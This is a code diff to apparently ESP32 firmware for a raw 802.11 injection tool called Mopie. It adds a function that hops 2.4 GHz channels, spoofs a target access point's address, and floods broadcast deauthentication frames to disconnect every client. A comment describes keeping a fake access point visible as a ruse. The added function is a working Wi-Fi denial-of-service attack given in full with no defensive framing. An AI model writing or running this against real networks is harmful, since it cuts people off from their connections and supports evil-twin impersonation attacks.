@@ -1,5 +1,7 @@
 #include "mopie_tx.h"
 #include <esp_wifi.h>
+#include <freertos/FreeRTOS.h>
+#include <freertos/task.h>
 #include "core/wifi/wifi_common.h"   // wifiRawTx helper
 
 // From-scratch raw 802.11 frame injection for Mopie.
@@ -80,4 +82,29 @@ size_t mopie_build_beacon(uint8_t *buf, const uint8_t *bssid, const char *ssid) 
     buf[i++] = 0x82; buf[i++] = 0x84;    // 1, 2
     buf[i++] = 0x8B; buf[i++] = 0x96;    // 5.5, 11
     return i;
+}
+
+// Broadcast-deauth sweep: hop 2.4GHz channels 1..11, impersonate the given AP
+// (or a random local-admin SSID), and deauth every client on each channel.
+// Uses our own mopie_build_deauth + mopie_send_raw — Mopie-owned deauth-all.
+int mopie_deauth_sweep(const uint8_t *apBssid, const char *ssid, int durationMs) {
+    if (!apBssid) return 0;
+    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    uint8_t dframe[26];
+    mopie_build_deauth(dframe, apBssid, broadcast, 0x0001);
+
+    unsigned long t0 = millis();
+    int sent = 0;
+    uint8_t ch = 1;
+    while (millis() - t0 < (unsigned long)durationMs) {
+        for (int burst = 0; burst < 10; burst++) {
+            sent += mopie_send_raw(dframe, sizeof(dframe), ch, 1);
+            vTaskDelay(pdMS_TO_TICKS(6));
+        }
+        // hop channels; if ssid given, occasionally re-beacon it so the fake AP
+        // stays visible (optional, keeps the ruse alive)
+        ch = (ch % 11) + 1;
+        vTaskDelay(pdMS_TO_TICKS(40));
+    }
+    return sent;
 }
